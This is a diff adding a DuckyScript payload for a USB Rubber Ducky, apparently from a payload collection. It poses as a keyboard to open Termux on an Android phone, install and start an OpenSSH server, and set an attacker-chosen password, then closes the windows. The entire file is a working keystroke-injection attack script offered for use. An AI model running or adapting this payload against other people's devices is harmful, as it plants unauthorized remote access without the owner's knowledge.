@@ -1,0 +1,30 @@
+REM       Enable SSH - Android
+REM       Version 1.0
+REM       OS: Android
+REM       Author: KryptoKola
+REM	    Requirements: RubberDucky, Android Device with Termux Installed
+REM       Description: This payload will install and run OpenSSH on Android devices with Termux installed. (Termux should be installed from F-droid for best results).
+REM	    Configuration: Place a password in the "NewPasswordHere" and "ConfirmPasswordHere" fields below.
+
+ATTACKMODE HID
+DELAY 500
+GUI f
+DELAY 1000
+STRING termux
+DELAY 500
+TAB
+DELAY 100
+TAB
+DELAY 500
+ENTER
+DELAY 1500
+STRINGLN pkg update -y;pkg install root-repo -y;pkg install openssh -y;ssh-keygen -A;sshd;passwd;
+DELAY 20000
+STRINGLN NewPasswordHere
+DELAY 500
+STRINGLN ConfirmPasswordHere
+DELAY 500
+ALT F4
+DELAY 100
+ALT F4
+DELAY 500
